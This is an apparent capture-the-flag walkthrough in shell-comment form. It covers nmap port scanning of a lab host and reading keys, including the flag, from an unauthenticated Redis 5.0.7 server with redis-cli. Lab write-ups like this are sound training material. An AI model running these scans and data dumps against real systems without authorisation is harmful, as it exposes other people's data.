# Initial full-port scan with service detection
nmap -p- -sV 10.129.168.23

# Faster full-port scan
# --min-rate=5000 attempts to send packets at a high rate.
# -T4 uses a more aggressive timing template.
nmap -p- --min-rate=5000 -T4 10.129.168.23


# -p 6379 scans only Redis' port.
# -sV performs service/version detection.
sudo nmap -p 6379 -sV 10.129.168.23

# Install Redis command-line tools.
sudo apt install redis-tools


# Display redis-cli command-line options.
redis-cli --help

# Connect to the Redis server.
# -h specifies the remote host.
redis-cli -h 10.129.168.23

###############################################################################
# Redis commands used inside redis-cli
###############################################################################

# Display information about the Redis server.
info

# Select Redis database 0.
select 0

# List all keys stored in the selected database.
keys *

# Retrieve the value stored under the "flag" key.
get flag

# Retrieve other discovered keys.
get temp
get numb
get stor

###############################################################################
# Important findings
#
# Redis was running on:
# TCP/6379
#
# Redis version:
# 5.0.7
#
# Database:
# db0
#
# Keys discovered:
# flag
# temp
# numb
# stor
#
# The "flag" key contained the challenge flag.
###############################################################################